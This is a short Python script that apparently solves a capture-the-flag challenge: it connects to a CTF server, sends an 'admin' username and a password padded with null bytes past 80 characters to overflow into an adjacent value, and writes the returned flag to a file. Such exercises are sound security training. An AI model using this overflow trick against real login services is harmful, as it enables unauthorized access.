import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('cns.ctf.tw', 7000))

usr = 'admin'
pwd = 'how_do_you_turn_this_on'
pwd += '\0' * (80 - len(pwd)) + '1'

# Username
data = client_socket.recv(512)
client_socket.send(usr + '\n')

# Password
data = client_socket.recv(512)
client_socket.send(pwd + '\n')

# Catch the flag
data = client_socket.recv(512)
with open('ans1-1.txt', 'w') as f:
    f.write(data)
